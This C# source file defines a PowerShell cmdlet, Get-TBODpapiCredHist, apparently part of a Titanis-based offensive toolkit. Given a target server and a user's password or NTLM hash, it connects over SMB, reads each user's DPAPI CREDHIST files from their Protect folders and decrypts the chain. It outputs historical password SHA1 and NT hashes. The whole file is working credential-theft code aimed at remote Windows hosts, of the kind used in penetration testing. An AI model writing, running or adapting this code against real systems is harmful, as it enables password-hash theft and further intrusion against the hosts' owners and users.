using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Titanis;
using Titanis.Net;
using Titanis.Smb2;
using Titanis.Winterop;
using Titanis.Winterop.Security;
using Winterop = Titanis.Winterop;

namespace Titanis.Tbo.Smb2.PowerShell
{
	public sealed class TboDpapiCredHistEntryInfo
	{
		public string ServerName { get; init; } = string.Empty;
		public string ShareName { get; init; } = string.Empty;
		public string? UserName { get; init; }
		public string? UserSid { get; init; }

		public string CredHistPath { get; init; } = string.Empty;
		public uint FooterMagic { get; init; }
		public string? CurrentGuid { get; init; }
		public string? StartHashLabel { get; init; }

		public int EntryIndex { get; init; }
		public string? EntryGuid { get; init; }
		public bool? IsCurrent { get; init; }
		public string? PasswordHashHex { get; init; }
		public string? NtHashHex { get; init; }

		public string? FailureReason { get; init; }
	}

	[Cmdlet(VerbsCommon.Get, "TBODpapiCredHist")]
	[OutputType(typeof(TboDpapiCredHistEntryInfo))]
	public sealed class GetTBODpapiCredHist : SmbCmdlet
	{
		[Parameter(Mandatory = true, Position = 0, ValueFromPipelineByPropertyName = true)]
		public string ServerName { get; set; } = string.Empty;

		[Parameter]
		public string ShareName { get; set; } = DpapiMasterKeyLocator.DefaultShareName;

		[Parameter]
		public string[]? UserName { get; set; }

		[Parameter]
		public string? UserPassword { get; set; }

		[Parameter]
		public string? UserNtlmHash { get; set; }

		private CancellationTokenSource? _cancelSource;

		protected override void ProcessRecord(ISmbProviderInfo smb)
		{
			this._cancelSource ??= new CancellationTokenSource();
			var cancellationToken = this._cancelSource.Token;

			var serverName = DpapiHelpers.NormalizeServerName(this.ServerName);
			if (string.IsNullOrWhiteSpace(serverName))
				throw new ArgumentException("ServerName must be provided.", nameof(this.ServerName));

			var shareName = DpapiHelpers.NormalizeShareName(this.ShareName);
			if (string.IsNullOrWhiteSpace(shareName))
				throw new ArgumentException("ShareName must be provided.", nameof(this.ShareName));

			var startHashes = ResolveStartHashes();
			if (startHashes.Count == 0)
			{
				this.WriteWarning("Get-TBODpapiCredHist requires UserPassword/UserNtlmHash to decrypt CREDHIST.");
				return;
			}

			var userFilters = ChromeHelpers.BuildUserFilters(this.UserName);
			var userDirs = ChromeHelpers.EnumerateUserDirectories(
				smb,
				serverName,
				shareName,
				userFilters,
				message => this.LogWarning(smb, message),
				message => this.LogVerbose(smb, message),
				(context, ex) => this.LogException(smb, context, ex),
				cancellationToken);

			foreach (var userDirName in userDirs)
			{
				ProcessProtectRoot(
					smb,
					serverName,
					shareName,
					userDirName,
					UncPath.Parse($@"\\{serverName}\{shareName}\Users\{userDirName}\AppData\Roaming\Microsoft\Protect"),
					startHashes,
					cancellationToken);

				ProcessProtectRoot(
					smb,
					serverName,
					shareName,
					userDirName,
					UncPath.Parse($@"\\{serverName}\{shareName}\Users\{userDirName}\AppData\Local\Microsoft\Protect"),
					startHashes,
					cancellationToken);
			}
		}

		protected override void StopProcessing()
		{
			this._cancelSource?.Cancel();
			base.StopProcessing();
		}

		private List<(string Label, byte[] Hash)> ResolveStartHashes()
		{
			byte[]? userNtHash = null;
			if (!string.IsNullOrWhiteSpace(this.UserNtlmHash))
			{
				try
				{
					userNtHash = NtlmHashInput.Parse(this.UserNtlmHash).NtHash;
				}
				catch (Exception ex)
				{
					throw new ArgumentException($"UserNtlmHash was invalid: {ex.Message}", nameof(this.UserNtlmHash), ex);
				}
			}

			byte[]? userSha1Hash = null;
			byte[]? userNtHashFromPassword = null;
			if (!string.IsNullOrWhiteSpace(this.UserPassword))
			{
				var pwdUtf16 = Encoding.Unicode.GetBytes(this.UserPassword);
				userSha1Hash = SHA1.HashData(pwdUtf16);

				if (userNtHash == null)
				{
					userNtHashFromPassword = Titanis.Crypto.SlimHashAlgorithm
						.ComputeHash<Titanis.Crypto.Md4Context>(pwdUtf16);
				}
			}

			var candidates = new List<(string Label, byte[] Hash)>();
			if (userSha1Hash != null && userSha1Hash.Length > 0)
				candidates.Add(("SHA1(password)", userSha1Hash));
			if (userNtHash != null && userNtHash.Length > 0)
				candidates.Add(("UserNtlmHash", userNtHash));
			if (userNtHashFromPassword != null && userNtHashFromPassword.Length > 0)
				candidates.Add(("NT(password)", userNtHashFromPassword));

			return candidates
				.GroupBy(x => Convert.ToHexString(x.Hash), StringComparer.OrdinalIgnoreCase)
				.Select(g => g.First())
				.ToList();
		}

		private void ProcessProtectRoot(
			ISmbProviderInfo smb,
			string serverName,
			string shareName,
			string userDirName,
			UncPath protectRoot,
			IReadOnlyList<(string Label, byte[] Hash)> startHashes,
			CancellationToken cancellationToken)
		{
			var fileSystem = SmbFileSystemResolver.Resolve(smb);
			ISmbDirectory? dir = null;

			try
			{
				dir = fileSystem.OpenDirectory(protectRoot, cancellationToken);
				foreach (var entry in dir.QueryEntries("*", Smb2Directory.Smb2DirQueryOptions.QueryReparseInfo, SecurityInfo.None, Smb2Directory.DefaultQueryBufferSize, cancellationToken))
				{
					if (string.IsNullOrEmpty(entry.FileName))
						continue;
					if (entry.FileName is "." or "..")
						continue;

					bool isDirectory = (entry.FileAttributes & Winterop.FileAttributes.Directory) != 0;
					bool isReparse = (entry.FileAttributes & Winterop.FileAttributes.ReparsePoint) != 0;
					if (!isDirectory || isReparse)
						continue;
					if (!SidPattern.IsMatch(entry.FileName))
						continue;

					var sidDir = protectRoot.Append(entry.FileName);
					var credHistPath = sidDir.Append("CREDHIST");

					byte[] bytes;
					try
					{
						bytes = DpapiHelpers.ReadFileBytes(smb, credHistPath, cancellationToken);
					}
					catch (NtstatusException ex) when (ChromeHelpers.IsMissingPath(ex))
					{
						continue;
					}
					catch (NtstatusException ex) when (ChromeHelpers.IsAccessDenied(ex))
					{
						this.LogVerbose(smb, $"Get-TBODpapiCredHist access denied reading {credHistPath}: {ex.StatusCode}.");
						continue;
					}
					catch (Exception ex)
					{
						this.LogException(smb, $"Get-TBODpapiCredHist failed to read {credHistPath}", ex, emitWarning: false);
						this.WriteObject(new TboDpapiCredHistEntryInfo
						{
							ServerName = this.ServerName,
							ShareName = this.ShareName,
							UserName = userDirName,
							UserSid = entry.FileName,
							CredHistPath = credHistPath.ToString(),
							FailureReason = $"Failed to read CREDHIST: {ex.Message}"
						});
						continue;
					}

					DpapiCredHistFile credHistFile;
					try
					{
						credHistFile = DpapiCredHistFile.Parse(bytes);
					}
					catch (Exception ex)
					{
						this.WriteObject(new TboDpapiCredHistEntryInfo
						{
							ServerName = this.ServerName,
							ShareName = this.ShareName,
							UserName = userDirName,
							UserSid = entry.FileName,
							CredHistPath = credHistPath.ToString(),
							FailureReason = $"Failed to parse CREDHIST: {ex.Message}"
						});
						continue;
					}

					string? usedLabel = null;
					string? failureReason = null;
					IReadOnlyList<DpapiCredHistDecryptedEntry> decryptedEntries = Array.Empty<DpapiCredHistDecryptedEntry>();

					foreach (var (label, startHash) in startHashes)
					{
						if (credHistFile.TryDecryptChain(startHash, out decryptedEntries, out failureReason))
						{
							usedLabel = label;
							break;
						}
					}

					if (decryptedEntries != null && decryptedEntries.Count > 0)
					{
						var currentGuidText = credHistFile.CurrentGuid?.ToString();
						for (int i = 0; i < decryptedEntries.Count; i++)
						{
							var dec = decryptedEntries[i];
							var isCurrent = credHistFile.CurrentGuid.HasValue && credHistFile.CurrentGuid.Value == dec.Guid;

							this.WriteObject(new TboDpapiCredHistEntryInfo
							{
								ServerName = this.ServerName,
								ShareName = this.ShareName,
								UserName = userDirName,
								UserSid = dec.UserSid,
								CredHistPath = credHistPath.ToString(),
								FooterMagic = credHistFile.FooterMagic,
								CurrentGuid = currentGuidText,
								StartHashLabel = usedLabel,
								EntryIndex = i,
								EntryGuid = dec.Guid.ToString(),
								IsCurrent = isCurrent,
								PasswordHashHex = dec.PasswordHash?.ToHexString(),
								NtHashHex = dec.NtHash?.ToHexString()
							});
						}
					}
					else
					{
						var tried = string.Join(", ", startHashes.Select(s => s.Label));
						this.WriteObject(new TboDpapiCredHistEntryInfo
						{
							ServerName = this.ServerName,
							ShareName = this.ShareName,
							UserName = userDirName,
							UserSid = entry.FileName,
							CredHistPath = credHistPath.ToString(),
							FooterMagic = credHistFile.FooterMagic,
							CurrentGuid = credHistFile.CurrentGuid?.ToString(),
							FailureReason = $"Failed to decrypt CREDHIST (tried {tried}): {failureReason ?? "unknown error"}"
						});
					}
				}
			}
			catch (NtstatusException ex) when (ChromeHelpers.IsMissingPath(ex))
			{
				this.LogVerbose(smb, $"Get-TBODpapiCredHist could not open {protectRoot}: {ex.StatusCode}.");
			}
			catch (NtstatusException ex) when (ChromeHelpers.IsAccessDenied(ex))
			{
				this.LogVerbose(smb, $"Get-TBODpapiCredHist access denied opening {protectRoot}: {ex.StatusCode}.");
			}
			catch (Exception ex)
			{
				this.LogException(smb, $"Get-TBODpapiCredHist failed to enumerate {protectRoot}", ex);
				throw;
			}
			finally
			{
				if (dir != null)
					dir.Dispose();
			}
		}

		private static readonly Regex SidPattern = new(
			@"^S-1-\d+(-\d+)+$",
			RegexOptions.Compiled | RegexOptions.IgnoreCase);
	}
}
